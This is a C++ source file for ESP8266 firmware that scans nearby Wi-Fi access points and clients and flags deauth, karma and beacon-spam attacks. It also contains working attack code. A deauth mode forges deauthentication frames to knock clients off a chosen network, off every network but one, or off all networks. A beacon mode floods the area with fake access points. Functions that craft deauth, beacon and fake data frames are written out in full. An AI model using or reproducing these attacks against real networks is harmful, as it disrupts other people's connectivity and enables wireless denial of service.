// ======================================================================== //
// ixty                                                                2018 //
// ======================================================================== //
// Project     : ESP8266 fun                                                //
// Filename    : wifi.cpp                                                   //
// Description : core of the program, handles everything wifi               //
// ======================================================================== //

#include "status.h"
#include "ui.h"
#include "wifi.h"
#include "devs.h"
#include "utils.h"

// detection settings
#define TRESHOLD_DEAUTH     5       // per timer duration (1s)
#define TRESHOLD_KARMA      5000    // max msecs since essid change
#define TRESHOLD_BEACONS    5       // num fake APs removed since last time

// internals
#define MAX_SEND_RETRIES    5       // attempts to send a frame over the air
#define BEACON_COUNT        1       // nb of beacons sent everytime the callback is triggered

// disabled by default
int FEATURE_BANDHOP = 0;    // hops from B, G & N bands (or stay on N band by default)
int FEATURE_REPORT = 0;     // turns on AP + client dumping over serial port


// ========================================================================= //
// main funcs
// ========================================================================= //
void wifi_init(void)
{
    ui_printf("> wifi init start\n");

    status.mode     = MODE_DETECT;
    status.channel  = 1;
    status.phy      = PHY_MODE_11N;
    status.chanhop  = 1000;

    // init promisc sniffing
    wifi_set_opmode(STATION_MODE);
    wifi_set_phy_mode((phy_mode)status.phy);
    wifi_set_channel(status.channel);
    wifi_promiscuous_enable(0);
    wifi_set_promiscuous_rx_cb(wifi_sniff);
    wifi_promiscuous_enable(1);

    ui_printf("> wifi init done\n");
}

void wifi_loop(void)
{
    uint32_t now = millis();

    WTIMER(status.chanhop,  cb_cswitch);
    WTIMER(5000,            cb_report);
    WTIMER(10,              cb_beacon);
    WTIMER(1033,            cb_detect);
    WTIMER(1066,            cb_cleanup);
}

int wifi_send_pkt(uint8_t * frame, size_t len)
{
    for(int i=0; i<MAX_SEND_RETRIES; i++)
        if(wifi_send_pkt_freedom(frame, len, 0) == 0)
        {
            status.pkt_sent += 1;
            return 0;
        }

    status.pkt_errs += 1;
    return -1;
}

// ========================================================================= //
// mode switching & navigation
// ========================================================================= //
void wifi_switch_mode(void)
{
    if(status.mode == MODE_DEAUTH && status.deauth_mode)
        status.mode = MODE_DETECT;
    else
        status.mode = (wmode_t)((status.mode + 1) % MODE_MAX);

    // reset internal vars
    status.ui_level         = 0;
    status.ui_idx           = 0;
    status.pkt_sent         = 0;
    status.pkt_recv         = 0;
    status.pkt_errs         = 0;
    status.spoofed_aps      = 0;
    status.spoofed_clients  = 0;
    status.deauth_mode      = 0;
    status.channel_focus    = 0;
    status.chanhop          = status.mode == MODE_DETECT ? 1000 : 250;

    ui_printf("> switched to mode: %s\n", wmode_str(status.mode));
}

// detect mode levels:
// lvl0 = global status
// lvl1 = AP select
// lvl2 = AP menu (deauth black / deauth white / show clients / track)
void wifi_switch_updown(int down)
{
    int next_lvl = down ? status.ui_level + 1 : status.ui_level - 1;
    next_lvl = next_lvl < 0                 ? 0 : next_lvl;
    next_lvl = next_lvl > 5                 ? 5 : next_lvl;
    next_lvl = status.mode != MODE_DETECT   ? 0 : next_lvl;

    // nothing to do
    if(next_lvl == status.ui_level)
        return;

    // focus on AP
    if(status.ui_level == 0 && next_lvl == 1)
    {
        status.ui_idx = 0;
        status.cur_ap = status.aps;
        status.channel_focus = status.cur_ap->channel;
        status.chanhop = 250;
        ui_printf("> focusing on AP #%d (%s chan: %d)\n", status.ui_idx, status.cur_ap->essid, status.cur_ap->channel);
    }
    // back to status
    if(status.ui_level == 1 && next_lvl == 0)
    {
        ui_printf("> stoped AP focus");
        status.channel_focus = 0;
        status.chanhop = 1000;
    }
    // enter AP action menu
    if(status.ui_level == 1 && next_lvl == 2)
        status.ui_idx = 0;
    // back to AP selection
    if(status.ui_level == 2 && next_lvl == 1)
        status.ui_idx = dev_ap_index(status.cur_ap);

    // enter AP action
    if(status.ui_level == 2 && next_lvl == 3)
    {
        if(!status.cur_ap)
            return;

        switch(clamp_modulo(status.ui_idx, 4))
        {
            // select clients view
            case 0:
                status.cur_cli = status.cur_ap->clients;
                status.ui_idx = 0;
                break;

            // deauth target network
            case 1:
                memcpy(status.deauth_mac, status.cur_ap->mac, 6);
                status.deauth_mode      = 1;
                status.mode             = MODE_DEAUTH;
                status.pkt_sent         = 0;
                status.pkt_recv         = 0;
                status.pkt_errs         = 0;
                break;

            // deauth all except target network
            case 2:
                memcpy(status.deauth_mac, status.cur_ap->mac, 6);
                status.deauth_mode      = 2;
                status.mode             = MODE_DEAUTH;
                status.pkt_sent         = 0;
                status.pkt_recv         = 0;
                status.pkt_errs         = 0;
                break;

            // graph view
            case 3:
                ui_clear();
                status.graph_count = 0;
                next_lvl = 4;
                break;
        }
    }
    // leave AP graph
    if(status.ui_level == 4 && next_lvl == 3)
        next_lvl = 2;
    // client view to client graph
    if(status.ui_level == 3 && next_lvl == 4)
    {
        ui_clear();
        status.graph_count = 0;
        next_lvl = 5;
    }
    // client graph back to client view
    if(status.ui_level == 5 && next_lvl == 4)
        next_lvl = 3;

    status.ui_level = next_lvl;
    ui_printf("> ui_level: %d\n", status.ui_level);
}

void wifi_switch_leftright(int right)
{
    if(status.mode == MODE_DETECT && status.ui_level == 1)
    {
        // no APs yet?
        if(!status.cur_ap)
        {
            status.cur_ap = status.aps;
            status.ui_idx = 0;
            return;
        }

        // go to prev/next ap in circular ll
        status.cur_ap = right ? status.cur_ap->next : status.cur_ap->prev;
        status.ui_idx = dev_ap_index(status.cur_ap);

        // refocus on current AP's channel
        ui_printf("> focusing on channel: %d\n", status.cur_ap->channel);
        status.channel_focus = status.cur_ap->channel;
        status.chanhop = 250;
    }
    if(status.mode == MODE_DETECT && status.ui_level == 3)
    {
        if(!status.cur_ap || status.cur_ap->clients_count == 0)
        {
            ui_printf("> bad cur ap or no clients\n");
            status.cur_cli = NULL;
            status.ui_idx = 0;
            return;
        }

        status.ui_idx += right ? 1 : -1;
        ui_printf("> cli ind: %d (count: %d)\n", status.ui_idx, status.cur_ap->clients_count);
        while(status.ui_idx < 0)
            status.ui_idx += status.cur_ap->clients_count;
        while(status.ui_idx >= status.cur_ap->clients_count)
            status.ui_idx -= status.cur_ap->clients_count;

        ui_printf(">> ind: %d\n", status.ui_idx);
        status.cur_cli = status.cur_ap->clients;
        for(int i=0; i<status.ui_idx && status.cur_cli; i++)
            status.cur_cli = status.cur_cli->apnext;
        ui_printf(">> ptr: 0x%x\n", status.cur_cli);
    }
    else
    {
        status.ui_idx += right ? 1 : -1;
    }
}

void wifi_shutdown(void)
{
    ui_printf("> shutdown");
    delay(50);
    ui_line(0, "");
    ui_line(1, "");
    ui_line(2, "");
    ui_line(3, "");
    delay(50);

    system_deep_sleep_set_option(RF_DEFAULT);
    system_deep_sleep(10 * 1000000);
    yield();
}

// ========================================================================= //
// timer callbacks
// ========================================================================= //

// timer to hop channels
void cb_cswitch(void)
{
    // focusing on a channel? if yes & not currently on it, switch to focused chan
    if(status.channel_focus && wifi_get_channel() != status.channel_focus)
    {
        // ui_printf("> chan switch %d\n", status.channel_focus);
        wifi_set_channel(status.channel_focus);
        return;
    }

    status.channel += 1;
    if(status.channel > 14)
    {
        status.channel = 1;

        if(FEATURE_BANDHOP)
        {
            status.phy += 1;
            if(status.phy > PHY_MODE_11N)
                status.phy = PHY_MODE_11B;
            wifi_set_phy_mode((phy_mode)status.phy);
        }
    }
    wifi_set_channel(status.channel);
    // ui_printf("> chan switch %d\n", status.channel);
}

// output detected networks & clients
void cb_report(void)
{
    char tmp1[20];
    char tmp2[20];

    if(!FEATURE_REPORT)
        return;

    ui_printf("> ap: %d cli: %d\n", status.aps_count, status.clients_count);

    if(status.aps)
    {
        wifi_ap_t * ap = status.aps;
        do
        {
            bin_to_hex(ap->mac, 6, tmp1, sizeof(tmp1));
            ui_printf("AP[%s] e[%-20s] c[%2d] ch[%2d] pkts[%4d] sig[%2d]\n", tmp1, ap->essid, ap->clients_count, ap->channel, ap->beacons, ap->rssi);
        } while(ap != status.aps);
    }

    if(status.clients)
    {
        wifi_client_t * cli = status.clients;
        do
        {
            wifi_ap_t * ap  = cli->ap;

            bin_to_hex(cli->mac, 6, tmp1, sizeof(tmp1));
            if(ap)
                bin_to_hex(ap->mac, 6, tmp2, sizeof(tmp2));
            else
                snprintf(tmp2, sizeof(tmp2), "n/a");

            ui_printf("CLI[%s] assoc[%s] essid[%s] pkts[%d] rssi[%d]\n", tmp1, tmp2, ap ? ap->essid : "n/a", cli->pkt_count, cli->rssi);
        } while(cli != status.clients);
    }
}

// send a fake beacon
void cb_beacon(void)
{
    static uint16_t seq_num     = 0;
    uint8_t         packet_buffer[128];
    char            essid[33]   = {};
    uint8_t         mac[6]      = {};
    uint8_t         cli[6]      = {};

    if(status.mode != MODE_BEACON)
        return;

    for(int i=0; i<BEACON_COUNT; i++)
    {
        int num_clients = 1;
        size_t l;

        // send a fake beacon from a random mac address
        rand_essid(essid, sizeof(essid));
        rand_mac(mac);
        l = craft_beacon(packet_buffer, mac, essid, (seq_num++)<<4);
        if(wifi_send_pkt(packet_buffer, l) == 0)
            status.spoofed_aps += 1;

        // send a fake data packet from AND to a fake client (rand mac addr aswell)
        for(int j=0; j<num_clients; j++)
        {
            rand_mac(cli);
            l = craft_data(packet_buffer, cli, mac, 1, (seq_num++)<<4);
            if(wifi_send_pkt(packet_buffer, l) == 0)
                status.spoofed_clients += 1;

            l = craft_data(packet_buffer, cli, mac, 0, (seq_num++)<<4);
            wifi_send_pkt(packet_buffer, l);
        }
    }
}

// detect attacks
void cb_detect(void)
{
    static uint32_t last_pkt_deauth = 0;
    static uint32_t last_fake_aps = 0;

    uint32_t now = millis();

    status.detected_deauth = 0;
    status.detected_beacon = 0;
    status.detected_karma  = 0;

    // deauth attacks detection
    if(status.detected_pkt_deauth - last_pkt_deauth > TRESHOLD_DEAUTH)
    {
        ui_printf("> deauth attack detected! %d deauth packets!\n", status.detected_pkt_deauth - last_pkt_deauth);
        status.detected_deauth = 1;
    }
    last_pkt_deauth = status.detected_pkt_deauth;

    // karma detection
    if(status.aps)
    {
        wifi_ap_t * ap = status.aps;
        do
        {
            if(ap->essid_time && now - ap->essid_time < TRESHOLD_KARMA && ap->essid_count > 1)
            {
                status.detected_karma = 1;
                char tmp[20];
                bin_to_hex(ap->mac, 6, tmp, sizeof(tmp));
                ui_printf("> karma attack detected for mac %s (%s)!\n", tmp, ap->essid);
            }

        } while(ap != status.aps);
    }

    // beacon spam detect
    if(status.detected_fake_aps - last_fake_aps > TRESHOLD_BEACONS)
    {
        ui_printf("> beacon spam detected! %d fake aps removed!\n", status.detected_fake_aps - last_fake_aps);
        status.detected_beacon = 1;
    }
    last_fake_aps = status.detected_fake_aps;
}

void cb_cleanup(void)
{
    int n = devs_cleanup();
    if(n > 0)
        ui_printf("> cleaned up %d devs\n", n);
}


// ========================================================================= //
// frame parsing
// ========================================================================= //

// frame parsing callback
void wifi_sniff(uint8_t * buf, uint16_t len)
{
    struct RxControl * hdr = (struct RxControl *)buf;
    frame_t * frame = (frame_t*) ((uint8_t *)buf + sizeof(struct RxControl));
    size_t frame_len = len - sizeof(struct RxControl);

    char essid[33] = {};
    uint8_t chan = 0;
    uint8_t enc = 0;
    uint8_t ht = 0;

    status.pkt_recv += 1;

    if(len < sizeof(struct RxControl) || frame_len < sizeof(frame_t))
        return;

    // try to parse beacon / probe responses
    if(parse_beacon(frame, frame_len, essid, &chan, &enc, &ht) == 0)
    {
        devs_lock();
        wifi_ap_t * ap = dev_ap_find(frame->addr3, 1);
        if(!ap)
        {
            devs_unlock();
            return;
        }

        dev_ap_update(ap, hdr->rssi, essid, chan ? chan : status.channel, enc, ht);
        devs_unlock();
    }

    // deauth
    if(frame->type == 0xA0 || frame->type == 0xC0)
        status.detected_pkt_deauth += 1;

    // we need mac addrs from here on
    uint8_t * cmac = NULL;
    uint8_t * amac = NULL;
    if(frame_get_macs(frame, frame_len, &cmac, &amac) < 0)
        return;

    // data frame
    if((frame->type & 0x0f) == 0x08)
    {
        devs_lock();
        wifi_client_t * cli = dev_cli_find(cmac);
        wifi_ap_t *     ap  = dev_ap_find(amac, 0);
        if(!cli)
        {
            devs_unlock();
            return;
        }
        dev_cli_update(cli, ap, hdr->rssi);
        devs_unlock();
    }

    // deauth all the things ?!
    if(status.mode == MODE_DEAUTH)
    {
        int do_deauth = 0;

        // black list targetting? only attack specified AP
        if(status.deauth_mode == 1 && !memcmp(amac, status.deauth_mac, 6))
            do_deauth = 1;
        // white list targetting? attack everybody but this AP
        else if(status.deauth_mode == 2 && memcmp(amac, status.deauth_mac, 6))
            do_deauth = 1;
        // target everybody
        else if(!status.deauth_mode)
            do_deauth = 1;

        // attack with deauth packet now
        if(do_deauth)
        {
            uint8_t  packet_buffer[64];
            uint16_t seq = (((uint8_t*)frame)[23] << 8) | ((uint8_t*)frame)[22];

            size_t l = craft_deauth(packet_buffer, cmac, amac, seq + 0x10);
            wifi_send_pkt(packet_buffer, l);
            status.attack_time = millis();
        }
    }
}


// returns client & bss macs
// will make sure the addresses are valid (not multicast / broadcast / ...)
int frame_get_macs(frame_t * frame, size_t frame_len, uint8_t ** cli, uint8_t ** bss)
{
    int to_ds = frame->flags & 0x01;
    int from_ds = frame->flags & 0x02;

    // ignore non-standard cases
    if((!to_ds && !from_ds) || (to_ds && from_ds))
        return -1;

    if(from_ds)
    {
        *bss = frame->addr2;
        *cli = frame->addr1;
    }
    else
    {
        *bss = frame->addr1;
        *cli = frame->addr2;
    }

    if(is_bad_mac(*cli) || is_bad_mac(*bss))
        return -1;

    return 0;
}


// extract essid, chan, enctype & ht from beacon
int parse_beacon(frame_t * frame, size_t len, char essid[33], uint8_t * channel, uint8_t * enc, uint8_t * ht)
{
    int ret = -1;

    // expect frame of type beacon
    if((frame->type & 0xf0) != 0x80)
        // or probe response
        if((frame->type & 0xf0) != 0x50)
            return -1;

    // parse fixed params (wep)
    if(*(uint16_t*)&frame->data[10] & 0x10)
        *enc = AP_ENC_WEP;

    // skip fixed params now
    uint8_t * p = &frame->data[0] + 12;

    // parse dynamic params
    while(p + 3 < ((uint8_t*)frame + len))
    {
        uint8_t t = p[0];
        uint8_t l = p[1];

        // dont parse incomplete blocks
        if(p + l >= ((uint8_t*)frame + len))
            break;

        // valid beacon / probe resp if we're here
        ret = 0;

        // parse essid
        if(t == 0)
        {
            memcpy(essid, p + 2, l > 32 ? 32 : l);
            essid[l > 32 ? 32 : l] = 0;
        }
        // parse current channel
        else if(t == 3)
            *channel = p[2];
        // HT capabilities
        else if(t == 0x2d)
            *ht = 1;
        // VHT capa
        else if(t == 0xbf)
            *ht = 2;
        // vendor specific
        else if(t == 0xdd)
        {
            // wpa1
            if(!memcmp(&p[2], "\x00\x50\xf2", 3))
                *enc = AP_ENC_WPA1;
        }
        // wpa2
        else if(t == 0x30)
            *enc = AP_ENC_WPA2;

        p += l + 2;
    }

    return ret;
}


// ========================================================================= //
// frame crafting
// ========================================================================= //

uint16_t craft_deauth(uint8_t * buf, uint8_t * client, uint8_t * ap, uint16_t seq)
{
    int i=0;

    // frame control
    buf[0] = 0xC0;
    buf[1] = 0x00;
    // duration
    buf[2] = 0x00;
    buf[3] = 0x00;
    // dst
    for (i=0; i<6; i++) buf[i+4] = client[i];
    // src
    for (i=0; i<6; i++) buf[i+10] = ap[i];
    // bss
    for (i=0; i<6; i++) buf[i+16] = ap[i];
    // seq + frag
    buf[22] = seq % 0xFF;
    buf[23] = seq / 0xFF;
    // deauth reason
    buf[24] = 1;
    buf[25] = 0;
    return 26;
}

uint16_t craft_beacon(uint8_t * buf, uint8_t * bss, char * essid, uint16_t seq)
{
    uint16_t l = 0;
    int i;

    // frame control
    buf[0] = 0x80;
    buf[1] = 0x00;
    // duration
    buf[2] = 0x00;
    buf[3] = 0x00;
    // dest broadcast
    for (i=0; i<6; i++) buf[i+4] = 0xff;
    // src
    for (i=0; i<6; i++) buf[i+10] = bss[i];
    // bss
    for (i=0; i<6; i++) buf[i+16] = bss[i];
    // seq + frag
    buf[22] = seq % 0xFF;
    buf[23] = seq / 0xFF;

    // timestamp
    uint32_t mc = micros();
    memcpy(buf + 24, &mc, 4);
    memset(buf + 28, 0, 4);

    // beacon interval
    memcpy(buf + 32, "\x64\x00", 2);
    // capabilities
    memcpy(buf + 34, "\x01\x04", 2);

    // essid
    buf[36] = 0;
    buf[37] = strlen(essid);
    memcpy(buf + 38, essid, buf[37]);

    l = 38 + strlen(essid);

    // suported rates
    memcpy(buf + l, "\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24", 10);    l += 10;

    // channel
    memcpy(buf + l, "\x03\x01\x06",                              3);    l += 3;
    buf[l-1] = random(1,12);

    // extended rates
    memcpy(buf + l, "\x32\x04\x30\x48\x60\x6c",                  6);    l += 6;

    return l;
}

uint16_t craft_data(uint8_t * buf, uint8_t * cli, uint8_t * bss, int from_ds, uint16_t seq)
{
    uint8_t * src = from_ds ? cli : bss;
    uint8_t * dst = from_ds ? bss : cli;

    buf[0] = 0x88;                  // qos data
    buf[1] = 0x40;                  // protected frame
    buf[2] = 0x00;                  // duration
    buf[3] = 0x00;
    memcpy(buf + 4, dst, 6);        // dst
    memcpy(buf + 10, src, 6);       // src
    memcpy(buf + 16, bss, 6);       // bss
    buf[22] = seq % 0xFF;           // seq + frag
    buf[23] = seq / 0xFF;

    buf[24] = 0;                    // qos control
    buf[25] = 0;

    uint32_t r1 = rand();           // tkip params
    uint32_t r2 = rand();
    memcpy(buf + 26, &r1, 4);
    memcpy(buf + 30, &r2, 4);

    int data_len = 32;
    for(int i=0; i<data_len; i++)
        buf[34 + i] = rand() & 0xff;

    return 34 + data_len;
}

